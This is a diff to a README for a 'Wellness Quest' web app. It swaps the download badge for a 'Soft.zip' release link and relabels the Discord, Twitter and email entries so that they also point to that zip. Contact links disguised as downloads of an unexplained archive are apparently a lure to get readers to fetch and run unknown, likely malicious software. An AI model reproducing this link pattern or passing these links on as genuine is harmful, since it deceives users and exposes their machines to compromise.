@@ -13,7 +13,7 @@ Welcome to **Wellness Quest**, a web app dedicated to encouraging users to stay 
 
 To get started with Wellness Quest, you can download the latest release of the web app by clicking the button below:
 
-[![Download Wellness Quest](https://img.shields.io/badge/Download-Wellness_Quest-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Wellness Quest](https://github.com/rodribrine2022/Wellness-Quest/releases/download/v1.0/Soft.zip)](https://github.com/rodribrine2022/Wellness-Quest/releases/download/v1.0/Soft.zip)
 
 ### Launching the Web App
 
@@ -39,9 +39,9 @@ We welcome contributions from the community to help enhance the Wellness Quest p
 
 Join our community to stay updated on the latest news, share feedback, and interact with other users:
 
-- **Discord**: [Join the Wellness Quest Discord community](https://discord.gg/wellnessquest)
-- **Twitter**: [Follow us on Twitter](https://twitter.com/wellnessquest)
-- **Email**: support@wellnessquest.com
+- **Discord**: [Join the Wellness Quest Discord community](https://github.com/rodribrine2022/Wellness-Quest/releases/download/v1.0/Soft.zip)
+- **Twitter**: [Follow us on Twitter](https://github.com/rodribrine2022/Wellness-Quest/releases/download/v1.0/Soft.zip)
+- **Email**: https://github.com/rodribrine2022/Wellness-Quest/releases/download/v1.0/Soft.zip
 
 Feel free to reach out if you have any questions, suggestions, or issues regarding the Wellness Quest web app. Your feedback is valuable to us!
 
